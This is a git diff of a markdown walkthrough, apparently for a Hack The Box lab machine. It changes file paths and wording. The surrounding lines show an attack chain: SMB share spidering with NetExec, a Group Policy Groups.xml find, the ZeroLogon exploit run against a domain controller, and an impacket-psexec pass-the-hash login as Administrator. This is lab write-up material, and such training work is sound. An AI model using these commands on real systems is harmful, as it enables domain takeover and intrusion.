@@ -90,11 +90,11 @@ nxc smb 10.10.10.100 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
 
 And then navigated to the folder `Replication`:
 
-- `/home/asdf/.nxc/modules/nxc_spider_plus/10.10.10.100/Replication`
+- `~/.nxc/modules/nxc_spider_plus/10.10.10.100/Replication`
 
 After some enumeration I found this file:
 
-- `/home/asdf/.nxc/modules/nxc_spider_plus/10.10.10.100/Replication/active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml`
+- `~/.nxc/modules/nxc_spider_plus/10.10.10.100/Replication/active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml`
 
 And it had these contents:
 
@@ -194,7 +194,6 @@ ZEROLOGON   10.10.10.100    445    DC               Next step: https://github.co
 The target is vulnerable. I followed the link in the output (https://github.com/dirkjanm/CVE-2020-1472), downloaded the exploit, and tested it:
 
 ```shell
-# The hostname of the target is "DC" according to NetExec
 python exp.py DC 10.10.10.100
 Performing authentication attempts...
 ===============================================================================================================================================================================================================================
@@ -234,7 +233,7 @@ DC$:des-cbc-md5:235df1fd2afb3e5b
 [*] Cleaning up... 
 ```
 
-And get `RCE` as administrator with `psexec` (since there was no other port open).
+And get `RCE` as administrator.
 
 ```shell
 impacket-psexec Administrator@10.10.10.100 -hashes :5ffb4aaaf9b63dc519eca04aec0e8bed
